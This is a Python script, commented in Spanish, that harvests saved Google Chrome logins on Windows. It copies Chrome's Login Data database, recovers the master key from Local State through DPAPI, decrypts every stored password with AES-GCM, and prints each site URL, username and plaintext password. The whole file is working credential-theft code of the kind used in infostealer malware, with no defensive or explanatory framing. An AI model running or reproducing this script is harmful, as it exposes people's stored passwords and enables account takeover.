import os
import json
import base64
import shutil
import sqlite3
import win32crypt
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend


local_state_path = os.path.join(os.environ['USERPROFILE'], r'AppData\Local\Google\Chrome\User Data\Local State')


login_data_path = os.path.join(os.environ['USERPROFILE'], r'AppData\Local\Google\Chrome\User Data\Default\Login Data')


temp_login_db = os.path.join(os.environ['TEMP'], 'LoginData_temp.db')
shutil.copyfile(login_data_path, temp_login_db)


def get_encryption_key():
    with open(local_state_path, 'r', encoding='utf-8') as file:
        local_state = json.load(file)
    
    # Obtener la clave maestra y desencriptarla con DPAPI
    encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    encrypted_key = encrypted_key[5:]  
    decrypted_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    return decrypted_key


def decrypt_password(encrypted_password, key):
    try:
        nonce = encrypted_password[3:15]  
        ciphertext = encrypted_password[15:-16] 
        tag = encrypted_password[-16:] 


        cipher = Cipher(algorithms.AES(key), modes.GCM(nonce, tag), backend=default_backend())
        decryptor = cipher.decryptor()
        decrypted_password = decryptor.update(ciphertext) + decryptor.finalize()

        return decrypted_password.decode('utf-8')
    except Exception as e:
        print(f"Error al desencriptar la contraseña: {e}")
        return None

# Obtener la clave maestra para desencriptar las contraseñas
encryption_key = get_encryption_key()


conn = sqlite3.connect(temp_login_db)
cursor = conn.cursor()


cursor.execute('SELECT origin_url, username_value, password_value FROM logins')


for row in cursor.fetchall():
    origin_url = row[0]
    username = row[1]
    encrypted_password = row[2]

    if encrypted_password[:3] == b'v10' or encrypted_password[:3] == b'v11':

        decrypted_password = decrypt_password(encrypted_password, encryption_key)
    else:

        decrypted_password = win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1].decode('utf-8')


    print(f"URL: {origin_url}")
    print(f"Username: {username}")
    print(f"Password: {decrypted_password}")
    print("-" * 40)


conn.close()
os.remove(temp_login_db)

